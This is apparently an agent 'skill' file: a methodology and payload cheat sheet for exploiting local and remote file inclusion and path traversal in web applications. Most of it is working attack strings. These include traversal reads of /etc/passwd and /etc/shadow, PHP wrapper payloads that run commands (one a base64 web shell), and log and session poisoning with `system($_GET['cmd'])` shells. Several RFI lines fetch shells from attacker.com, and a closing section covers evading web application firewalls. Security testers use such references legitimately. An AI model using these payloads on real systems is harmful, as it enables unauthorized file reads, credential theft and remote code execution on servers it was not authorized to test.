---
description: Local and Remote File Inclusion (LFI/RFI) and Path Traversal testing methodology. Covers log poisoning, wrapper abuse, and escalation to RCE.
tags: LFI, RFI, Path Traversal, Web, Log Poisoning, RCE
---

# LFI / RFI & Path Traversal

LFI, RFI, and Path Traversal vulnerabilities allow attackers to read arbitrary files on the server or execute remote code. This skill provides a comprehensive testing methodology.

## Initial Recon & Discovery

1. Identify parameters that might handle files:
   - `?page=`, `?file=`, `?doc=`, `?dir=`, `?path=`, `?folder=`, `?include=`, `?view=`
   - Check headers, cookies, and POST bodies.
2. Observe application behavior:
   - Does it append `.php` or `.html` to the input?
   - Does it strip `../`?

## Path Traversal & Basic LFI

1. Basic Linux file reads:
   - `../../../../../../../../etc/passwd`
   - `../../../../../../../../etc/shadow`
2. Basic Windows file reads:
   - `..\..\..\..\..\..\..\..\windows\win.ini`
   - `..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts`
3. Bypass techniques:
   - Null byte injection (if PHP < 5.3): `../../../etc/passwd%00`
   - URL encoding: `%2e%2e%2f`
   - Double URL encoding: `%252e%252e%252f`
   - Stripping bypass: `....//....//....//etc/passwd`

## PHP Wrapper Abuse

If the application is PHP-based, wrappers can often be abused to extract source code or execute commands.

1. **`php://filter`** (Read Source Code):
   - `php://filter/convert.base64-encode/resource=index.php`
   - `php://filter/read=string.rot13/resource=index.php` (WAF Bypass)
   - `php://filter/convert.iconv.utf-8.utf-16/resource=index.php` (WAF Bypass)
2. **`php://input`** (RCE via POST data, requires `allow_url_include=On`):
   - URL: `?page=php://input`
   - POST Data: `<?php system('id'); ?>`
3. **`data://`** (RCE, requires `allow_url_include=On`):
   - `data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=&cmd=id`
   - `data://text/plain,<?php system('id'); ?>`
4. **`expect://`** (RCE, requires PECL expect extension):
   - `expect://id`
5. **`zip://` / `phar://`** (RCE via uploaded archives):
   - `zip://uploads/archive.zip#shell.php`
   - `phar://uploads/archive.phar/shell.php`

## Escalation to RCE (Log Poisoning)

If you can read log files, you can inject PHP code into the logs and then include the log file to execute the code.

1. **Apache/Nginx Access Logs**:
   - Inject payload via User-Agent: `<?php system($_GET['cmd']); ?>`
   - Include the log: `?page=/var/log/apache2/access.log&cmd=id`
2. **SSH Logs** (`/var/log/auth.log`):
   - SSH login with payload as username: `ssh '<?php system($_GET['cmd']); ?>'@target`
   - Include the log: `?page=/var/log/auth.log&cmd=id`
3. **SMTP Logs** (`/var/log/mail.log`):
   - Send email via telnet injecting PHP in `VRFY`, `EXPN`, or `RCPT TO`.
4. **Session Poisoning**:
   - Inject PHP into your session data (e.g. via profile update).
   - Include session file: `?page=/var/lib/php/sessions/sess_<session_id>`

## Remote File Inclusion (RFI)

Requires `allow_url_include=On` (in PHP).

1. Basic RFI:
   - `?page=http://attacker.com/shell.txt`
   - `?page=//attacker.com/shell.txt` (Bypass `http://` filters)
   - `?page=\\attacker.com\shared\shell.php` (SMB share RFI on Windows)
2. Bypass extension appending (e.g., appends `.php`):
   - Terminate with `?`: `?page=http://attacker.com/shell.php?`
   - Terminate with `#`: `?page=http://attacker.com/shell.php%23`

## Bypass Techniques & WAF Evasion

1. **Path Traversal Evasion:**
   - URL encode: `%2e%2e%2f`
   - Double URL encode: `%252e%252e%252f`
   - Unicode bypass: `..%c0%af` or `..%ef%bc%8f`
   - Nested traversal (if `../` is stripped once): `....//....//etc/passwd` or `..././..././etc/passwd`
2. **Filter Evasion:**
   - Use absolute paths if relative paths are blocked: `?page=/etc/passwd`
   - Case manipulation (Windows): `?page=..\Windows\System32\cmd.exe`
3. **Instructions for usage:**
   - When injecting these payloads, monitor the HTTP response size and status code. Often, a successful read will return a `200 OK` but a significantly different content length. If a payload gets blocked by a WAF (e.g., `403 Forbidden`), switch to encoding/wrapper obfuscation.

## Useful Files to Extract

- `/etc/passwd` (Users)
- `/etc/shadow` (Hashes - requires root)
- `/proc/self/environ` (Environment variables, possible RCE)
- `/proc/self/cmdline` (Running command)
- `C:\Windows\System32\inetsrv\config\applicationHost.config` (IIS config)

## Automation

- **Ffuf**: `ffuf -c -w wordlist.txt -u http://target.com/index.php?page=FUZZ`
- **LFISuite**: Automated tool for discovering and exploiting LFI.
- **PayloadsAllTheThings**: Comprehensive LFI/RFI lists.
- **Seclists**: `SecLists/Fuzzing/LFI/`

- **Author**: **Vivek Chanchal**
